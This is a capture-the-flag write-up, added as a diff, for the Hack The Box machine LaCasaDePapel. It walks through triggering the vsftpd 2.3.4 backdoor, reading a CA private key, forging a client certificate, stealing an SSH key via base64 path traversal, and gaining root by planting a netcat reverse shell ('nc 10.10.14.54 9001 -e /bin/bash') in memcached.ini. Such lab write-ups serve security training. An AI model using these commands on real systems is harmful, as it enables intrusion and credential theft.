@@ -1,0 +1,146 @@
+HTB-LaCasaDePapel-Writeup
+
+IP : 10.10.10.131
+
+Nmap
+----
+- nmap found 4 open ports 
+	- 21 running FTP
+	- 22 running SSH
+	- 80 running Node js Express framework 
+	- 443 running Node js Express framework
+
+- add lacasadepapel.htb to /etc/hosts
+
+Enumeration
+-----------
+- FTP anonymous login is not allowed 
+- on visiting port 80 we get a page with a QR code 
+- on scanning the qr code with google authenticator on phone and we got a numeric token (818420)
+- this doesnt look useful to us, moving on
+- checking port 443 we get an error message saying “Sorry, but you need to provide a client certificate to continue.”
+- checking the FTP service again the version was vsftpd 2.3.4
+- searching for known exploits for the version in searchsploit gives us a backdoor command execution exploit from metasploit 
+- tried with metasploit but it didnt work 
+- on further googling we found an exploit 
+- the exploit is pretty simple , we need to connect to ftp over netcat with a username that contains :) in it and when we connect to port 6200 we get a shell
+- we can do a quick nmap scan on port 6200 since this was not shown in the initial nmap scan
+
+	nmap -p 6200 lacasadepapel.htb
+
+- and we can see that port 6200 is open
+- we can follow the instructions in the exploit and get a shell 
+
+	nc 10.10.10.131 21
+	USER lord:)
+
+	rlwrap nc 10.10.10.131 6200
+
+- after getting connected the banner says Psy Shell v0.9.9 which is an interactive shell used for php debugging and we can use it to execute php
+- we tried executing system commands but it didnt work
+
+	exec("whoami")
+	system("whoami")
+
+- use help to view all the commands that are available to us
+- scandir to list the files in current directory
+
+	scandir(".")
+
+- on listing the directories in /home we got a name of few users in this machine  
+	- berlin
+	- dali
+	- nairobi
+	- oslo
+	- professor
+
+- on checking out each users, we found the user flag in /home/berlin but its not accessible to us 
+- from the help command we used before to view all the commands available to us we know that ls can be used to view the variables 
+- on running ls we can see the variable tokyo 
+- checking out variable tokyo
+
+	show $tokyo
+
+- the function sign() in the variable $tokyo is using the private key from /home/nairobi/ca.key
+- we can grab that key to create a client certificate to access port 443
+- get the private key
+
+	file_get_contents('/home/nairobi/ca.key');
+
+- first we can create a certificate signing request (CSR)
+
+	openssl req -new -key ca.key -out server.csr 
+
+- we can use that to generate the certificate 
+
+	openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt
+
+- we can create a PKCS12 certificate
+
+	openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
+
+- now we can import the certificate to firefox
+
+	certificate manager > your certificate > import > server.p12
+
+- now we visit port 443 and it will request for our client certificate 
+- after getting access to 443 we have options to choose season 1 or season 2 of the series 
+- clicking on any one of them will take us to a page to download episodes 
+- from the url we an see that there is a parameter called path which reads files from the given path 
+- if this parameter is not filtered corrctly it can cause a path traversal vulnerability to list files in other directory
+- just listing files does not provide us with any attack surface , we can already do that wth psy shell
+- while downloading a file the download link will be 
+
+	https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp
+
+- decoding the base64 we get
+
+	SEASON-1/01.avi
+
+- the link requests files from the path
+- lets check where we are first using 
+	
+	https://lacasadepapel/?path=../
+
+- we are in berlins home directory
+- we tried to download ssh key for berlin but it didnt work
+- we can try to download ssh key of professor
+
+	https://lacasadepapel/?path=../.ssh/id_rsa
+
+-encode the path value into base64 and send the request
+
+	https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=
+
+- download the id_rsa for professor and ssh into the box 
+
+	ssh professor@lacasadepapel.htb -i id_rsa
+
+- we cannot read the user flag in berlins home directory as professr so we download the file 
+
+	echo -n "../user.txt" | base64
+	https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=
+
+- grab the user flag 
+
+Priv-esc
+--------
+- in the home directory of professor there are two interesting files
+	- memcached.ini
+	- memcached.js
+
+- we can only read memcached.js but cant write to both
+- memcached.ini is running /usr/bin/node /home/professor/memcached.js as nobody with sudo
+- checking with pspy we can see that this command gets executed periodically 
+- we cant write to memcached.ini but we can delete it and create a new one 
+- add the following code to memcached.ini
+
+	[program:memcached]
+	command = /usr/bin/nc 10.10.14.54 9001 -e /bin/bash
+
+- start a netcat listener 
+
+	rlwrap nc -lnvp 9001
+
+- we got root 
+- grab the root flag 
